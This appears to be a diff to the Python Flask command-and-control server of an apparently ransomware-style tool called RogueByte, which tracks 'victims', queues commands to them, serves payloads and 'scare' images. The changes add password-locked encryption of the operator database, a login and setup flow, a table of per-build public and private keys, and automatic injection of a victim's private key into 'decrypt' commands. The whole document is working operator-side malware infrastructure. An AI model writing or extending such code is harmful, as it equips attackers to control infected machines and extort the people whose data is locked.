@@ -1,6 +1,7 @@
 import os
 import json
 import threading
+import hashlib
 import logging
 from datetime import datetime
 
@@ -17,8 +18,10 @@ logger = logging.getLogger('c2_server')
 
 DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
 DB_PATH = os.path.join(DATA_DIR, "c2_data.db")
-KEY_PATH = os.path.join(DATA_DIR, "keys", "c2_key.key")
+KEY_PATH = os.path.join(DATA_DIR, "keys", "c2_key.json")
 TRAFFIC_KEY_PATH = os.path.join(DATA_DIR, "keys", "traffic_key.key")
+
+crypto = None
 
 app = Flask(__name__, static_folder=None)
 app.config['TEMPLATE_AUTO_RELOAD'] = True
@@ -59,23 +62,77 @@ def init_db():
             timestamp TEXT NOT NULL
         )
     """)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS build_keys (
+            build_number INTEGER PRIMARY KEY AUTOINCREMENT,
+            public_key TEXT NOT NULL,
+            private_key TEXT NOT NULL,
+            created_at TEXT NOT NULL
+        )
+    """)
     conn.commit()
     conn.close()
 
 
-def load_key():
-    if os.path.exists(KEY_PATH):
-        with open(KEY_PATH, 'rb') as f:
-            return Fernet(f.read())
+def _derive_key(password: str, salt: bytes) -> bytes:
+    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)
+
+
+def _derive_fernet(password: str, salt: bytes) -> Fernet:
+    return Fernet(_derive_key(password, salt).hex().encode())
+
+
+VERIFY_PLAINTEXT = b'RogueByteOK'
+
+
+def _needs_setup() -> bool:
+    return not os.path.exists(KEY_PATH)
+
+
+def _save_key_data(salt: bytes, verify_token: bytes):
     os.makedirs(os.path.dirname(KEY_PATH), exist_ok=True)
-    key = Fernet.generate_key()
-    with open(KEY_PATH, 'wb') as f:
-        f.write(key)
-    logger.info("Generated new encryption key: %s", KEY_PATH)
-    return Fernet(key)
+    with open(KEY_PATH, 'w') as f:
+        json.dump({
+            'salt': salt.hex(),
+            'verify': verify_token.hex(),
+        }, f)
 
 
-crypto = load_key()
+def _load_key_data() -> tuple[bytes, bytes] | None:
+    if not os.path.exists(KEY_PATH):
+        return None
+    with open(KEY_PATH) as f:
+        data = json.load(f)
+    return bytes.fromhex(data['salt']), bytes.fromhex(data['verify'])
+
+
+def setup_crypto(password: str) -> bool:
+    global crypto
+    salt = os.urandom(16)
+    f = _derive_fernet(password, salt)
+    verify_token = f.encrypt(VERIFY_PLAINTEXT)
+    _save_key_data(salt, verify_token)
+    crypto = f
+    logger.info("Crypto setup complete — DB key derived from password")
+    return True
+
+
+def unlock_crypto(password: str) -> bool:
+    global crypto
+    key_data = _load_key_data()
+    if not key_data:
+        return False
+    salt, verify_token = key_data
+    f = _derive_fernet(password, salt)
+    try:
+        plain = f.decrypt(verify_token)
+        if plain != VERIFY_PLAINTEXT:
+            return False
+    except Exception:
+        return False
+    crypto = f
+    logger.info("Crypto unlocked via password")
+    return True
 
 
 def load_traffic_key():
@@ -202,6 +259,17 @@ def delete_victim(hostname: str):
     logger.info("Deleted victim from DB: %s", hostname)
 
 
+def get_private_key(build_number: int) -> str | None:
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    row = conn.execute(
+        "SELECT private_key FROM build_keys WHERE build_number = ?",
+        (build_number,)
+    ).fetchone()
+    conn.close()
+    return row[0] if row else None
+
+
 def get_command_log(hostname: str = None, limit: int = 20) -> list:
     import sqlite3
     conn = sqlite3.connect(DB_PATH)
@@ -307,6 +375,20 @@ def command_log():
     return jsonify(get_command_log(hostname))
 
 
+def _inject_private_key(hostname: str, params: dict) -> dict:
+    if params.get('private_key'):
+        return params
+    victim = get_victim(hostname)
+    if victim:
+        build_number = victim.get('data', {}).get('build_number')
+        if build_number:
+            pk = get_private_key(build_number)
+            if pk:
+                params['private_key'] = pk
+                logger.info("Auto-injected private key for %s (build #%s)", hostname, build_number)
+    return params
+
+
 @app.route('/send_command', methods=['POST'])
 def send_command():
     data = request.json
@@ -321,9 +403,13 @@ def send_command():
         if any(d in cmd_value.lower() for d in dangerous):
             return jsonify({'error': 'command blocked'}), 403
 
+    params = data.get('params', {})
+    if command == 'decrypt':
+        params = _inject_private_key(hostname, params)
+
     pending_commands[hostname] = {
         'command': command,
-        'params': data.get('params', {}),
+        'params': params,
     }
     logger.info("Queued %s for %s", command, hostname)
     return jsonify({'status': 'ok'})
@@ -342,6 +428,12 @@ def download_payload():
 
 @socketio.on('connect')
 def handle_connect():
+    if crypto is None:
+        emit('server_state', {
+            'locked': True,
+            'needs_setup': _needs_setup(),
+        })
+        return
     victims = get_all_victims()
     logs = get_command_log(limit=50)
     emit('dashboard_state', {
@@ -353,6 +445,8 @@ def handle_connect():
 
 @socketio.on('toggle_auto_deploy')
 def handle_toggle_auto_deploy(data):
+    if crypto is None:
+        return
     hostname = data.get('hostname')
     enabled = data.get('enabled', False)
     if not hostname:
@@ -369,6 +463,8 @@ def handle_toggle_auto_deploy(data):
 
 @socketio.on('send_command')
 def handle_send_command(data):
+    if crypto is None:
+        return
     hostname = data.get('hostname')
     command = data.get('command', '')
     params = data.get('params', {})
@@ -383,6 +479,9 @@ def handle_send_command(data):
         if any(d in cmd_value.lower() for d in dangerous):
             emit('command_sent', {'error': 'command blocked'})
             return
+
+    if command == 'decrypt':
+        params = _inject_private_key(hostname, params)
 
     pending_commands[hostname] = {'command': command, 'params': params}
     logger.info("Socket queued %s for %s", command, hostname)
@@ -429,6 +528,47 @@ def scare_gifs():
 SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')
 
 
+PUBLIC_ROUTES = ['/api/login', '/api/setup', '/assets/', '/api/shutdown']
+
+
+@app.before_request
+def lock_check():
+    if crypto is not None:
+        return
+    path = request.path
+    if path == '/':
+        return
+    for prefix in PUBLIC_ROUTES:
+        if path.startswith(prefix):
+            return
+    return jsonify({'error': 'server locked'}), 401
+
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.json or {}
+    password = data.get('password', '')
+    if not password:
+        return jsonify({'error': 'password required'}), 400
+    if unlock_crypto(password):
+        socketio.emit('server_unlocked', {'success': True})
+        return jsonify({'status': 'ok', 'message': 'unlocked'})
+    return jsonify({'error': 'invalid password'}), 403
+
+
+@app.route('/api/setup', methods=['POST'])
+def setup():
+    if not _needs_setup():
+        return jsonify({'error': 'already configured'}), 400
+    data = request.json or {}
+    password = data.get('password', '')
+    if not password or len(password) < 4:
+        return jsonify({'error': 'password must be at least 4 characters'}), 400
+    setup_crypto(password)
+    socketio.emit('server_unlocked', {'success': True, 'first_time': True})
+    return jsonify({'status': 'ok', 'message': 'crypto configured'})
+
+
 @app.route('/api/shutdown', methods=['POST'])
 def shutdown_server():
     data = request.json or {}
@@ -439,6 +579,29 @@ def shutdown_server():
     socketio.emit('server_shutting_down', {'message': 'server is shutting down'})
     threading.Thread(target=lambda: os._exit(0), daemon=True).start()
     return jsonify({'status': 'shutting down'})
+
+
+@socketio.on('unlock_server')
+def handle_unlock(data):
+    password = data.get('password', '')
+    if not password:
+        emit('unlock_result', {'success': False, 'error': 'password required'})
+        return
+    if _needs_setup():
+        success = setup_crypto(password)
+        emit('unlock_result', {'success': success, 'first_time': True})
+    else:
+        success = unlock_crypto(password)
+        emit('unlock_result', {'success': success})
+    if success:
+        logger.info("Server unlocked via socket")
+        victims = get_all_victims()
+        logs = get_command_log(limit=50)
+        emit('dashboard_state', {
+            'victims': victims,
+            'logs': logs,
+            'auto_deploy_targets': list(auto_deploy_targets),
+        })
 
 
 @socketio.on('shutdown_server')
